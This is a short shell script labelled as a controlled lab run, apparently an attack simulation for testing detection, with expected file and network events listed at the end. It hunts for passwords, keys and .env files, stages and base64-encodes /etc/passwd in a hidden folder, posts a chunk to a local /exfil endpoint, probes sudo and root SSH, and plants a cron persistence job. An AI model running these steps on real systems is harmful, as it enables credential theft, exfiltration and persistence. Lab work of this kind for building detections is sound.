# LIR-005: Credential hunting and staged exfil (controlled lab run)
mkdir -p /tmp/lab-lynx/.cache/.x
grep -rh "password" /etc 2>/dev/null | head -3
find /home -maxdepth 2 -name '*.pem' -o -name '.env' 2>/dev/null | head -3
cat /etc/passwd > /tmp/lab-lynx/.cache/.x/passwd.copy
base64 /etc/passwd | head -c 200 > /tmp/lab-lynx/.cache/.x/passwd.b64
curl -s -X POST -d 'chunk1' http://127.0.0.1:8099/exfil
sudo -l
ssh -o BatchMode=yes -o ConnectTimeout=2 root@127.0.0.1 whoami
crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/lab-lynx/.cache/.x/up.sh' | crontab - 2>/dev/null
echo '#!/bin/bash' > /tmp/lab-lynx/.cache/.x/up.sh
FILE:/tmp/lab-lynx/.cache/.x/passwd.copy:creation
FILE:/tmp/lab-lynx/.cache/.x/passwd.b64:creation
FILE:/tmp/lab-lynx/.cache/.x/up.sh:creation
NET:127.0.0.1:0:127.0.0.1:8099:curl
